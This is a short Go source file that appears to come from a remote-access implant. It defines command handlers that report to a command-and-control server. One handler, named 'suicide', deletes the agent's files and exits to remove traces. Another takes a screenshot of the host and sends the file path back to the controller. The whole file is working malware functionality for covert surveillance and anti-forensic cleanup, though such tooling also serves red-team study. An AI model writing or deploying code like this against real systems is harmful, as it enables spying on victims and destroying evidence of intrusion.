package agent

import (
	"fmt"
	"log"
	"os"

	"github.com/spf13/cobra"
)

// suicideCmdRun deletes agent files and exits.
func suicideCmdRun(cmd *cobra.Command, args []string) {
	if len(args) != 0 {
		SendCmdRespToC2(fmt.Sprintf("args error: %v", args), cmd, args)
		return
	}
	if err := os.RemoveAll(RuntimeConfig.AgentRoot); err != nil {
		SendCmdRespToC2(fmt.Sprintf("Failed to cleanup files: %v", err), cmd, args)
	} else {
		SendCmdRespToC2("Cleanup successful, exiting", cmd, args)
	}
	log.Println("Exiting...")
	os.Exit(0)
}

// screenshotCmdRun takes a screenshot and returns its path.
func screenshotCmdRun(cmd *cobra.Command, args []string) {
	out, err := Screenshot()
	if err != nil || out == "" {
		SendCmdRespToC2(fmt.Sprintf("Error: failed to take screenshot: %v", err), cmd, args)
		return
	}
	// Move file to agent's root directory.
	newPath := RuntimeConfig.AgentRoot + "/" + out
	if err := os.Rename(out, newPath); err != nil {
		log.Printf("screenshot rename error: %v", err)
		SendCmdRespToC2(fmt.Sprintf("screenshot rename error: %v", err), cmd, args)
		return
	}
	SendCmdRespToC2(newPath, cmd, args)
}
